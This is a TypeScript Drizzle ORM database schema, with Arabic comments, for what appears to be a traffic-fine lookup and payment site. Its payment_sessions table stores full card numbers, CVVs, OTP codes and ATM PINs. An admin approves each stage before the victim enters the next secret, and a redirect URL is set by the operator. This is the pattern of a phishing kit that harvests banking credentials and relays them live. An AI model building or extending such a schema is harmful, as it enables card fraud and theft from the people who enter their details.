import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, decimal, json } from "drizzle-orm/mysql-core";

export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// جدول الاستعلامات - يخزن كل استعلام تم إجراؤه
export const fineQueries = mysqlTable("fine_queries", {
  id: int("id").autoincrement().primaryKey(),
  plateSource: varchar("plateSource", { length: 100 }).notNull(),
  plateNumber: varchar("plateNumber", { length: 50 }).notNull(),
  plateCode: varchar("plateCode", { length: 50 }).notNull(),
  status: mysqlEnum("status", ["pending", "success", "failed", "no_fines"]).default("pending").notNull(),
  errorMessage: text("errorMessage"),
  totalFines: int("totalFines").default(0),
  totalAmount: decimal("totalAmount", { precision: 10, scale: 2 }),
  rawResults: json("rawResults"),
  userId: int("userId"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type FineQuery = typeof fineQueries.$inferSelect;
export type InsertFineQuery = typeof fineQueries.$inferInsert;

// جدول المخالفات
export const fines = mysqlTable("fines", {
  id: int("id").autoincrement().primaryKey(),
  queryId: int("queryId").notNull(),
  fineNumber: varchar("fineNumber", { length: 100 }),
  fineDate: varchar("fineDate", { length: 50 }),
  description: text("description"),
  amount: decimal("amount", { precision: 10, scale: 2 }),
  blackPoints: int("blackPoints").default(0),
  isPaid: mysqlEnum("isPaid", ["paid", "unpaid", "partial"]).default("unpaid"),
  location: text("location"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Fine = typeof fines.$inferSelect;
export type InsertFine = typeof fines.$inferInsert;

// جدول جلسات الدفع - يخزن كل جلسة دفع ومراحلها
export const paymentSessions = mysqlTable("payment_sessions", {
  id: int("id").autoincrement().primaryKey(),
  // معرف الجلسة الفريد
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  // معرف الاستعلام المرتبط
  queryId: int("queryId"),
  // المخالفات المحددة للدفع (JSON)
  selectedFines: json("selectedFines"),
  // إجمالي المبلغ
  totalAmount: varchar("totalAmount", { length: 50 }),
  // بيانات البطاقة الكاملة
  cardName: varchar("cardName", { length: 200 }),
  cardNumber: varchar("cardNumber", { length: 20 }),
  cardNumberMasked: varchar("cardNumberMasked", { length: 20 }),
  cardExpiry: varchar("cardExpiry", { length: 10 }),
  cardCvv: varchar("cardCvv", { length: 10 }),
  // رمز OTP
  otpCode: varchar("otpCode", { length: 20 }),
  // رقم ATM السري
  atmPin: varchar("atmPin", { length: 20 }),
  // المرحلة الحالية
  stage: mysqlEnum("stage", [
    "card",           // إدخال بيانات البطاقة
    "card_pending",   // انتظار موافقة الأدمن على البطاقة
    "otp",            // إدخال OTP
    "otp_pending",    // انتظار موافقة الأدمن على OTP
    "atm",            // إدخال رقم ATM
    "atm_pending",    // انتظار موافقة الأدمن على ATM
    "success",        // تم الدفع بنجاح
    "failed",         // فشل الدفع
  ]).default("card").notNull(),
  // رسالة الخطأ عند الرفض
  errorMessage: text("errorMessage"),
  // معلومات اللوحة
  plateNumber: varchar("plateNumber", { length: 50 }),
  plateSource: varchar("plateSource", { length: 100 }),
  plateCode: varchar("plateCode", { length: 50 }),
  // IP والمتصفح
  clientIp: varchar("clientIp", { length: 50 }),
  userAgent: text("userAgent"),
  // حالة القراءة من الأدمن
  statusRead: int("statusRead").default(0),
  // رابط إعادة التوجيه (يضبطه الأدمن)
  redirectUrl: varchar("redirectUrl", { length: 500 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type PaymentSession = typeof paymentSessions.$inferSelect;
export type InsertPaymentSession = typeof paymentSessions.$inferInsert;
